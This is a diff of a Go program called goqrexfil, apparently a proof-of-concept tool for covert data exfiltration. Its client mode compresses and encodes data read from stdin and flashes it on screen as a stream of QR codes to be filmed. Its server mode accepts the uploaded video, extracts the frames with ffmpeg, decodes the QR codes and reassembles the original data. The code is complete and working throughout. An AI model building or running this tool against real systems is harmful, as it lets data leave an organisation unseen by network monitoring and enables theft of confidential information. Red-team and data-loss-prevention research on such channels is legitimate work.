@@ -1,91 +1,89 @@
 package main
 
 import (
-	b64 "encoding/base64"
+	"bytes"
+	"encoding/base64"
+	"encoding/hex"
 	"flag"
 	"fmt"
+	"github.com/boombuler/barcode"
+	"github.com/boombuler/barcode/qr"
+	"github.com/gin-gonic/gin"
+	"github.com/kjk/smaz"
+	"github.com/makiuchi-d/gozxing"
+	"github.com/makiuchi-d/gozxing/qrcode"
+	log "github.com/sirupsen/logrus"
+	"github.com/zserge/lorca"
+	"golang.org/x/crypto/blake2b"
+	"image"
 	"image/png"
 	"io"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"time"
-
-	log "github.com/sirupsen/logrus"
-
-	qrcodeTerminal "github.com/Baozisoftware/qrcode-terminal-go"
-	"github.com/gin-gonic/gin"
-	"github.com/kjk/smaz"
-	"github.com/mattn/go-colorable"
-	"github.com/mdp/qrterminal"
-	"gopkg.in/bieber/barcode.v0"
 )
 
-// Environment will define the type of logging. Choices: *, production
-const Environment = "dev"
-
-var clear map[string]func() //create a map for storing clear funcs
+const port = "9999"
 const video = "./public/video.mp4"
-const payloadRetrieved = "./payload.raw"
-const maxbytes = 250
-const maxmsbetweenframes = 725
+const ffmpeg = "/opt/homebrew/bin/ffmpeg"
+const retrieved = "./payload/payload.raw"
+const maxBytes = 260
+const startTimer = 3
+const msBetweenFrames = 400
+
+var clear map[string]func()
 
 func init() {
 	clear = make(map[string]func()) //Initialize it
 	clear["linux"] = func() {
 		cmd := exec.Command("clear") //Linux example, its tested
 		cmd.Stdout = os.Stdout
-		cmd.Run()
+		err := cmd.Run()
+		if err != nil {
+			log.Fatal(err)
+		}
 	}
 	clear["windows"] = func() {
 		cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested
 		cmd.Stdout = os.Stdout
-		cmd.Run()
+		err := cmd.Run()
+		if err != nil {
+			log.Fatal(err)
+		}
 	}
 	clear["darwin"] = func() {
 		cmd := exec.Command("clear") //Linux example, its tested
 		cmd.Stdout = os.Stdout
-		cmd.Run()
+		err := cmd.Run()
+		if err != nil {
+			log.Fatal(err)
+		}
 	}
 }
 
-// CallClear exists to clear the command line
-func CallClear() {
-	value, ok := clear[runtime.GOOS] //runtime.GOOS -> linux, windows, darwin etc.
-	if ok {                          //if we defined a clear func for that platform:
-		value() //we execute it
-	} else { //unsupported platform
-		panic("Your platform is unsupported! I can't clear terminal screen :(")
+// RenderQR returns a QR code string from a string
+func RenderQR(chunk string) string {
+	qrCode, _ := qr.Encode(chunk, qr.H, qr.Unicode)
+	qrCode, _ = barcode.Scale(qrCode, 600, 600)
+	var buff bytes.Buffer
+	err := png.Encode(&buff, qrCode)
+	if err != nil {
+		log.Fatal(err)
 	}
+	encodedString := base64.StdEncoding.EncodeToString(buff.Bytes())
+	h := blake2b.Sum512([]byte(encodedString))
+	log.Info("New encoded chunk hash ", hex.EncodeToString(h[:]))
+	return "<img src=\"data:image/png;base64," + encodedString + "\" />"
 }
 
-// RenderQR as a QR code thanks to Claudio Dangelis
-// Copied from https://github.com/claudiodangelis/qrcp/blob/master/qr/qr.go
-func RenderQR(chunk string) {
-	qrConfig := qrterminal.Config{
-		HalfBlocks:     true,
-		Level:          qrterminal.H,
-		Writer:         os.Stdout,
-		BlackWhiteChar: "\u001b[37m\u001b[40m\u2584\u001b[0m",
-		BlackChar:      "\u001b[30m\u001b[40m\u2588\u001b[0m",
-		WhiteBlackChar: "\u001b[30m\u001b[47m\u2585\u001b[0m",
-		WhiteChar:      "\u001b[37m\u001b[47m\u2588\u001b[0m",
-	}
-	if runtime.GOOS == "windows" {
-		qrConfig.HalfBlocks = false
-		qrConfig.Writer = colorable.NewColorableStdout()
-		qrConfig.BlackChar = qrterminal.BLACK
-		qrConfig.WhiteChar = qrterminal.WHITE
-	}
-	qrterminal.GenerateWithConfig(chunk, qrConfig)
-}
-
-func chunkit(longString string, chunkSize int) []string {
-	slices := []string{}
+// payloadInChunks cut a string payload into multiple chunk of chunkSize
+func payloadInChunks(longString string, chunkSize int) []string {
+	var slices []string
 	lastIndex := 0
 	lastI := 0
 	for i := range longString {
@@ -101,130 +99,126 @@ func chunkit(longString string, chunkSize int) []string {
 	} else {
 		slices = append(slices, longString[lastIndex:])
 	}
-	// for _, str := range slices {
-	// 	fmt.Printf("(%s...) len: %d\n", str[0:5], len(str))
-	// }
 	return slices
 }
 
-func timeStr(sec int) (res string) {
-	wks, sec := sec/604800, sec%604800
-	ds, sec := sec/86400, sec%86400
-	hrs, sec := sec/3600, sec%3600
-	mins, sec := sec/60, sec%60
-	CommaRequired := false
-	if wks != 0 {
-		res += fmt.Sprintf("%d wk", wks)
-		CommaRequired = true
+// DecodeQRCode returns a string with the base64 encoded payload from the QR code
+func DecodeQRCode(img image.Image) string {
+	// prepare BinaryBitmap
+	bmp, e := gozxing.NewBinaryBitmapFromImage(img)
+	if e != nil {
+		log.Info("Error preparing bitmap:", e)
 	}
-	if ds != 0 {
-		if CommaRequired {
-			res += ", "
-		}
-		res += fmt.Sprintf("%d d", ds)
-		CommaRequired = true
-	}
-	if hrs != 0 {
-		if CommaRequired {
-			res += ", "
-		}
-		res += fmt.Sprintf("%d hr", hrs)
-		CommaRequired = true
-	}
-	if mins != 0 {
-		if CommaRequired {
-			res += ", "
-		}
-		res += fmt.Sprintf("%d min", mins)
-		CommaRequired = true
-	}
-	if sec != 0 {
-		if CommaRequired {
-			res += ", "
-		}
-		res += fmt.Sprintf("%d sec", sec)
-	}
-	return
-}
 
-func extractPayload(path string) string {
-	var retStr strings.Builder
-	fmt.Println("\n[*] Opening ", path)
-	fi, err := os.Open(path)
-	if err != nil {
-		log.Println(err.Error())
+	// decode image
+	qrReader := qrcode.NewQRCodeReader()
+	result, e := qrReader.Decode(bmp, nil)
+	if e != nil {
+		//log.Info("Error decoding data:", e)
 		return ""
 	}
-
-	log.Infoln("Decoding image..")
-	src, _ := png.Decode(fi)
-	log.Infoln("Retrieving payload..")
-
-	img := barcode.NewImage(src)
-	scanner := barcode.NewScanner().
-		SetEnabledAll(true)
-
-	symbols, _ := scanner.ScanImage(img)
-	type symbolsextended struct {
-		filename string
-	}
-	for _, s := range symbols {
-		// fmt.Println(s.Type.Name(), s.Data, s.Quality, s.Boundary)
-		filename := &symbolsextended{path}
-		log.Warnln(filename.filename, s.Type.Name(), s.Data)
-		retStr.WriteString(s.Data)
-	}
-
-	return retStr.String()
+	return result.GetText()
 }
 
-func splitIntoFrames() {
+/* retrievePayload is the main function that will take the uploaded video, extract frames and call DecodeQRCode to get the payload
+it will also concatenate all pieces and return the full payload back */
+func retrievePayload() bool {
+	// Split video into frames using ffmpeg. Ideally it should be a module and not an exec.command call
 	files, err := filepath.Glob("./public/*png")
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println("[*] Cleaning old files")
+	log.Info("[*] Cleaning old files and extracting video frames")
 	for _, f := range files {
 		if err := os.Remove(f); err != nil {
 			panic(err)
 		}
 	}
-	cmd := exec.Command("/usr/local/bin/ffmpeg", "-i", "./public/video.mp4", "-r", "1", "./public/%03d.png")
-	cmd.Run()
-	fmt.Println("[*] Frames extracted")
-}
+	cmd := exec.Command(ffmpeg, "-i", "./public/video.mp4",
+		"-loglevel", "error",
+		"-r", "1", "./public/%03d.png")
+	cmd.Stderr = os.Stderr
+	err = cmd.Run()
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Info("[*] Frames extracted")
 
-func retrievePayload() {
-	matches, _ := filepath.Glob("./public/*.png")
+	// Now we need to parse all frames, find if a QR Code is present and extract data from it
 	var payload string
+	matches, _ := filepath.Glob("./public/*png")
+	log.Info("[*] Extracting data from ", len(matches), " frames, skipping duplicates")
 	for _, match := range matches {
-		s := extractPayload(match)
-		if len(s) > 0 {
-			// in case two frames have same QR code and data
-			duplicate := strings.Contains(payload, s)
-			if duplicate == false {
-				payload += s
-			} else {
-				log.Infof("\n%s is duplicate.. Skipping", match)
+		fmt.Println("Decoding image from File ", match)
+		f, _ := os.Open(match)
+		img, _, _ := image.Decode(f)
+		err := f.Close()
+		if err != nil {
+			return false
+		}
+		buff := DecodeQRCode(img)
+		if len(buff) == 0 {
+			log.Info("Empty ... Skipping")
+		} else {
+			result := buff
+			if len(result) > 0 {
+				log.Info("Found payload!")
+				// in case two frames have same QR code and data
+				duplicate := strings.Contains(payload, result)
+				if duplicate == false {
+					payload += result
+					h := blake2b.Sum512([]byte(payload))
+					log.Info("Payload retrieved hash ", hex.EncodeToString(h[:]))
+				}
 			}
 		}
 	}
-	decoded, _ := b64.StdEncoding.DecodeString(payload)
-	decompressed, _ := smaz.Decode(nil, decoded)
-	// fmt.Println("\n-> Encoded payload:", compressedPayload)
-	// fmt.Println("-> Decoded payload:", decoded)
-	// fmt.Println("-> Decompressed/Original payload:", decompressed)
-	writePayloadFile(decompressed, payloadRetrieved)
-	fmt.Println("[*] Payload writen as ", payloadRetrieved)
+	log.Info("Finished retrieving all payload chunks, payload size ", len(payload))
+
+	var result = true
+	if len(payload) > 0 {
+		decoded, _ := base64.StdEncoding.DecodeString(payload)
+		decompressed, _ := smaz.Decode(nil, decoded)
+		writePayloadFile(decompressed, retrieved)
+		content, err := ioutil.ReadFile(retrieved)
+		if err != nil {
+			log.Fatal(err)
+		}
+		h := blake2b.Sum512(content)
+		log.Info("[*] Payload saved as ", retrieved, "\n   Blake2b 512:   ", hex.EncodeToString(h[:]))
+	} else {
+		log.Info("!!! No Payload retrieved from analyzed frames")
+		result = false
+	}
+	return result
 }
 
-// upload will get a file and save it in ./Public
-// test: curl -F 'file=@./1.jpg' http://localhost:8888/upload
 func server() {
 	gin.SetMode("release")
-	router := gin.Default()
+	//router := gin.Default()
+	router := gin.New()
+	router.Static("/process", "./public")
+	router.GET("/payload", func(c *gin.Context) {
+		// Source
+		f, err := os.Open(retrieved)
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer func(f *os.File) {
+			err := f.Close()
+			if err != nil {
 
-	router.Static("/", "./public")
+			}
+		}(f)
+		//Seems these headers needed for some browsers (for example without this headers Chrome will download files as txt)
+		c.Header("Content-Description", "File Transfer")
+		c.Header("Content-Transfer-Encoding", "binary")
+		c.Header("Content-Disposition", "attachment; filename="+retrieved)
+		c.Header("Content-Type", "application/octet-stream")
+		c.File(retrieved)
+	})
+	// upload will get a file and save it in ./Public
+	// test: curl -F 'file=@./1.jpg' http://localhost:9999/upload
 	router.POST("/upload", func(c *gin.Context) {
 		// Source
 		file, err := c.FormFile("file")
@@ -233,21 +227,35 @@ func server() {
 			return
 		}
 
-		// filename := filepath.Base(file.Filename)
 		if err := c.SaveUploadedFile(file, video); err != nil {
 			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
 			return
 		}
 		log.Println("\n[*] File received")
-		c.String(http.StatusOK, fmt.Sprintf("File %s uploaded successfully for processing", file.Filename))
-		splitIntoFrames()
-		retrievePayload()
+
+		// processing
+		result := retrievePayload()
+		myLink := "<b>No payload retrieved.</b>"
+		if result {
+			myLink = "<a href='/payload'>download payload</a>"
+		}
+		_, err = c.Writer.Write([]byte(myLink))
+		if err != nil {
+			log.Fatal("Cannot serve back the payload file")
+		}
 		return
 	})
-	router.Run(":8888")
+	log.Info("Serving on port ", port)
+	router.Run(":" + port)
 }
 
 func writePayloadFile(payload []byte, filename string) {
+	err := os.Remove(filename)
+	if err != nil {
+		log.Println("No previous payload file found")
+	} else {
+		log.Info("Deleted previous payload file")
+	}
 	// Open a new file for writing only
 	file, err := os.OpenFile(
 		filename,
@@ -257,27 +265,27 @@ func writePayloadFile(payload []byte, filename string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer file.Close()
+	defer func(file *os.File) {
+		err := file.Close()
+		if err != nil {
+
+		}
+	}(file)
 
 	// Write bytes to file
-	bytesWritten, err := file.Write(payload)
+	_, err = file.Write(payload)
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Printf("\n\n[*] Payload retrieved (%d bytes)\n", bytesWritten)
 }
 
+//goland:noinspection ALL
 func main() {
 	log.SetFormatter(&log.TextFormatter{
 		DisableColors: false,
 		FullTimestamp: true,
 	})
-	if Environment == "production" {
-		log.SetFormatter(&log.JSONFormatter{})
-	} else {
-		// The TextFormatter is default, you don't actually have to do this.
-		log.SetFormatter(&log.TextFormatter{})
-	}
+	log.SetFormatter(&log.TextFormatter{})
 	fmt.Println("-= goqrexfil =-")
 	isServer := flag.Bool("server", false, "server mode")
 	isClient := flag.Bool("client", false, "client mode")
@@ -286,8 +294,7 @@ func main() {
 
 	if *isProcessing {
 		log.Println("Processing only - DEBUG MODE")
-		splitIntoFrames()
-		retrievePayload()
+		_ = retrievePayload()
 	} else if *isServer {
 		// Server mode (retrieving data from video)
 		fmt.Println("[*] Server mode: ON")
@@ -309,24 +316,36 @@ func main() {
 		if len(readText) == 0 {
 			log.Fatalf("No data read from stdin")
 		}
-
-		// Compress, encode, chunk in pieces and display
+		// Compress, encode, payload in chunks then display the QrCodes
 		compressed := smaz.Encode(nil, readText)
-		encoded := b64.StdEncoding.EncodeToString(compressed)
-		// fmt.Printf("%s", encoded)
-		chunks := chunkit(encoded, maxbytes)
-		fmt.Printf("[*] Payload is in %d chunks, video recording time estimate: %s\n", len(chunks), timeStr(int(float64(len(chunks))*0.1)))
-		fmt.Println("\n\n---=== 5 seconds to use CTRL+C if you want to abort ===---")
-		time.Sleep(5 * time.Second)
-
-		for _, chunk := range chunks {
-			// log.Println("[D] Generating qr #", i+1)
-			time.Sleep(maxmsbetweenframes * time.Millisecond)
-			CallClear()
-			//RenderQR(chunk)
-			obj := qrcodeTerminal.New()
-			obj.Get(chunk).Print()
+		encoded := base64.StdEncoding.EncodeToString(compressed)
+		chunks := payloadInChunks(encoded, maxBytes)
+		fmt.Println("[*] Payload is in ", len(chunks), " chunks")
+		fmt.Println("**** Start your video, displaying in >", startTimer, "< seconds ****")
+		time.Sleep(3 * time.Second)
+		// Create UI with basic HTML passed via data URI
+		ui, error := lorca.New("data:text/html,"+url.PathEscape(`
+		<html>
+			<head><title>qrexfil PoC</title></head>
+			<h1>QR codes streaming starting now</h1>
+			</body>
+		</html>
+		`), "", 725, 725)
+		if error != nil {
+			log.Fatal("lorca.New():", err)
 		}
+
+		// Iterate on chunks, generate QR code and display it in UI
+		for _, chunk := range chunks {
+			time.Sleep(msBetweenFrames * time.Millisecond)
+			imgSrc := RenderQR(chunk)
+			ui.Load("data:text/html," + url.PathEscape(`<html><body><center>`+imgSrc+`</center></body></html>`))
+		}
+		time.Sleep(msBetweenFrames * time.Millisecond)
+		ui.Load("data:text/html," + url.PathEscape(`<html><body><h1>Done</h1></body></html>`))
+		<-ui.Done()
+		ui.Close()
+
 	} else {
 		fmt.Println("Please use client or server mode:")
 		fmt.Println("echo \"data to send\" | ./qr --client\t\tTo use in client mode")
